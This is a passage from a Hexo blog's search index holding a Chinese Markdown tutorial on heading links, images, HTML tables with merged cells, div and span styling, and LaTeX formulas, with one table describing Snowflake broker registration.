class="link">#自定义</span>)</span><br></pre></td></tr></table></figure><br><h3 id="5-3-2-跳转到标题"><a href="#5-3-2-跳转到标题" class="headerlink" title="5.3.2 跳转到标题"></a>5.3.2 跳转到标题</h3><p><a href="#1%E8%BF%99%E6%98%AF%E4%BB%A3%E7%A0%81">由此跳转到</a></p><p>踩坑记录: 像这样使用链接时,<strong>被跳转的标题中不能有空格!!!!!</strong></p><p>例如如果链接是这样:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[由此跳转到](#1 这是代码)</span><br></pre></td></tr></table></figure><p>那么在生成HTML后无法将其转化为链接</p><br><p>正确的形式:</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">由此跳转到</span>](<span class="link">#1这是代码</span>)</span><br></pre></td></tr></table></figure><p>不过这样也太容易出问题了,以后还是得采用多采用跳转到锚点的方式</p><hr><p><br><br></p><h1 id="6-图片"><a href="#6-图片" class="headerlink" title="6 图片"></a><strong>6 图片</strong></h1><p>直接插入图片:</p><p>(由于在typora中配置了插入图片时图片的存储规则,将图片复制进来时,图片会自动存储到source&#x2F;images&#x2F;与此md文件同名的文件夹)</p><p><img src="/images/markdownlearn/image-20220722114856557.png" alt="image-20220722114856557"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">image-20220722095454051</span>](<span class="link">/images/markdownlearn/image-20220722095454051.png</span>)</span><br></pre></td></tr></table></figure><p><img src="/images/markdownlearn/image-20220722095454051.png" alt="image-20220722095454051"></p><p><span id="s1">使用html来加载图片</span></p><p>好处是可以调整图片大小,加图片标题等</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;/images/markdownlearn/image-20220722095454051.png&#x27;</span> <span class="attr">width</span>=<span class="string">600px</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span> <span class="attr">align</span>=<span class="string">&#x27;center&#x27;</span> <span class="attr">style</span>=<span class="string">&#x27;font-size:15px;font-family:kaiti;color:black&#x27;</span>&gt;</span>图片标题 <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div align='center'>  <img src='/images/markdownlearn/image-20220722095454051.png' width=600px>  <p align='center' style='font-size:15px;font-family:kaiti;color:black'>图片标题 </p></div><br><p><strong>关于typora编辑器和部署后浏览器中图片无法同时正确显示的问题</strong>:</p><p>部署后,默认的根目录是public目录</p><p>此时图片的存储路径规则是 &#x2F;images&#x2F;markdown文件名&#x2F;图片名 , 所以如果在编辑器中以这种路径模式描述图片,图片就能够在浏览器中正确显示</p><p>而在生成public之前,一个md文件中的图片默认是存储在 <code>../../source/images/markdown文件名</code>这个目录下的</p><p>此时去下图位置将source设置成图片根目录,就能够保持编辑器和浏览器中图片路径一致,而且还能正确显示了</p><img src="/images/markdownlearn/image-20220722163205824.png" alt="image-20220722163205824" style="zoom: 67%;" /><br><br><hr><br><h1 id="7-表格"><a href="#7-表格" class="headerlink" title="7 表格"></a><strong>7 表格</strong></h1><p>直接插入表格即可(竟然也不支持合并单元格)</p><p>有合并单元格的需求的话,还得使用html的表格:</p><p>例如:</p><p>表格用整体table包裹</p><p>每一行用<strong>tr</strong>包裹(row)</p><p>表头中的文字用<strong>th</strong>包裹</p><p>具体单元格中的文字用<strong>td</strong>包裹</p><p>合并列用 colspan&#x3D;”合并的列数”</p><p>合并行用 rowspan&#x3D;”合并的行数”</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>班级<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>课程<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>平均分<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>1班<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>语文<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>95<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>数学<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>96<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>英语<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span>&gt;</span>92<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><table>     <tr>         <th>班级</th><th>课程</th><th>平均分</th>     </tr>     <tr>         <td rowspan="3">1班</td><td>语文</td><td>95</td>     </tr>     <tr>         <td>数学</td><td>96</td>     </tr>     <tr>         <td>英语</td><td>92</td>     </tr> </table><br><p>实践:</p><p><strong>注意!!! 列与列之间不要有空行</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">th</span>&gt;</span>交互双方<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>交互方式<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>具体情况<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;4&quot;</span>&gt;</span>client向broker注册<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">&quot;3&quot;</span>&gt;</span>HTTP POST<span class="tag">&lt;<span class="name">br</span>&gt;</span>(SDP被包含在request body中)<span class="tag">&lt;<span class="name">br</span>&gt;</span>(向broker下的&#x27;/client发送请求&#x27;)<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Client-&gt;Broker:<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;<span class="name">br</span>&gt;</span>POST /client HTTP<span class="tag">&lt;<span class="name">br</span>&gt;</span>[offer SDP]<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Broker-&gt;Client<span class="tag">&lt;<span class="name">br</span>&gt;</span>若成功匹配到一个proxy,则返回proxy的SDP:<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;<span class="name">br</span>&gt;</span>HTTP 200 OK[answer SDP]<span class="tag">&lt;<span class="name">br</span>&gt;</span>```<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>Broker-&gt;Client<span class="tag">&lt;<span class="name">br</span>&gt;</span>若没有匹配到可用的proxy,则返回503<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span>AMP(Accelerated Mobile Pages)<span class="tag">&lt;<span class="name">br</span>&gt;</span>The broker&#x27;s /amp/client endpoint receives client poll messages encoded into the URL path, and sends client poll responses encoded as HTML that conforms to the requirements of AMP (Accelerated Mobile Pages). This endpoint is intended to be accessed through an AMP cache, using the ampcache option of snowflake-client.<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><table>    <tr>         <th>交互双方</th><th>交互方式</th><th>具体情况</th>    </tr>    <tr>        <td rowspan="4">client向broker注册</td>        <td rowspan="3">HTTP POST<br>(SDP被包含在request body中)<br>(向broker下的'/client发送请求')</td>        <td>Client->Broker:<br>```<br>POST /client HTTP<br>[offer SDP]<br>```</td>    </tr>    <tr>        <td>Broker->Client<br>若成功匹配到一个proxy,则返回proxy的SDP:<br>```<br>HTTP 200 OK[answer SDP]<br>```</td>    </tr>    <tr>        <td>Broker->Client<br>若没有匹配到可用的proxy,则返回503</td>    </tr>    <tr>        <td>AMP(Accelerated Mobile Pages)<br>The broker's /amp/client endpoint receives client poll messages encoded into the URL path, and sends client poll responses encoded as HTML that conforms to the requirements of AMP (Accelerated Mobile Pages). This endpoint is intended to be accessed through an AMP cache, using the ampcache option of snowflake-client.</td>        <td></td>     </tr></table><br><hr><br><h1 id="8-使用HTML标签"><a href="#8-使用HTML标签" class="headerlink" title="8 使用HTML标签"></a>8 使用HTML标签</h1><p>对于 HTML 的块级元素 div、table、pre 和 p，请在其前后使用<strong>空行</strong>与其它内容进行分隔。尽量<strong>不要使用制表符（tabs）或空格（spaces）对 HTML 标签做缩进</strong>，否则将影响格式。</p><p>在 HTML 块级标签内不能使用 Markdown 语法。</p><p>例如下面一个p区块中的加粗语法将不起作用:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;italic and **bold**&lt;/p&gt; </span><br></pre></td></tr></table></figure> <p>italic and **bold**</p> <hr><br><h2 id="8-1-常用标签"><a href="#8-1-常用标签" class="headerlink" title="8.1 常用标签:"></a>8.1 常用标签:</h2><h3 id="div区块"><a href="#div区块" class="headerlink" title="div区块"></a>div区块</h3><p>定义一个区域部分,在其中使用p标签来区分段落</p><p>可选项: </p><ul><li>align: 此区块的位置: left&#x2F;right&#x2F;center</li><li>style:<ul><li>font-size:15px 字体大小</li><li>font-family:kaiti 字体</li><li>color:black 颜色</li><li>background-color:#FFFF00  背景颜色,这里的代码是黄色</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>   </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是一个在 div 元素中的文本。<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><div style="color:blue">       <p>这是一个在 div 元素中的文本。</p>    <p>这是一个在 div 元素中的文本。</p> </div><br><h3 id="span行内文本设置"><a href="#span行内文本设置" class="headerlink" title="span行内文本设置"></a>span行内文本设置</h3><p>在其他区块中的文本行内,对一部分文字进行修改</p><p>例如:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>我的母亲有 <span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;color:blue&quot;</span>&gt;</span>蓝色<span class="tag">&lt;/<span class="name">span</span>&gt;</span> 的眼睛。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我的母亲有 <span style="color:blue">蓝色</span> 的眼睛。</p><p>还可以设置字体大小,是否加粗等. <code>style</code>内整体用引号包裹,属性之间使用分号做间隔</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span> <span class="attr">style</span>=<span class="string">&quot;font-size:25px;font-weight:bold;background:yellow&quot;</span>&gt;</span>组件介绍:<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br></pre></td></tr></table></figure><br><h3 id="img插入图片"><a href="#img插入图片" class="headerlink" title="img插入图片"></a>img插入图片</h3><p><a href="#s1">看前面</a></p><br><hr><br><h1 id="9-LaTex语法"><a href="#9-LaTex语法" class="headerlink" title="9 LaTex语法"></a>9 LaTex语法</h1><p>参考: <a href="https://lanlan2017.github.io/blog/83c2e83a/">https://lanlan2017.github.io/blog/83c2e83a/</a></p><p>例如公式:</p><p>行内公式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其他内容$a^2+b^2=c^2$其他内容</span><br></pre></td></tr></table></figure><p>$a^2+b^2&#x3D;c^2$</p><br><hr><br><h1 id="10-markdown转html时容易出现的问题"><a href="#10-markdown转html时容易出现的问题" class="headerlink" title="10 markdown转html时容易出现的问题"></a>10 markdown转html时容易出现的问题</h1><ul><li><p>正文里尽量不用到 html的&lt;标签&gt;,如果必须要用,把它们放到代码框里</p></li><li><p>尽量多用html标签,例如在typora中如果想添加空行,不要直接回车换行,而是使用</p><pre><code class="html">&lt;br&gt;</code></pre></li><li><p>后面遇到问题再从这里补充</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
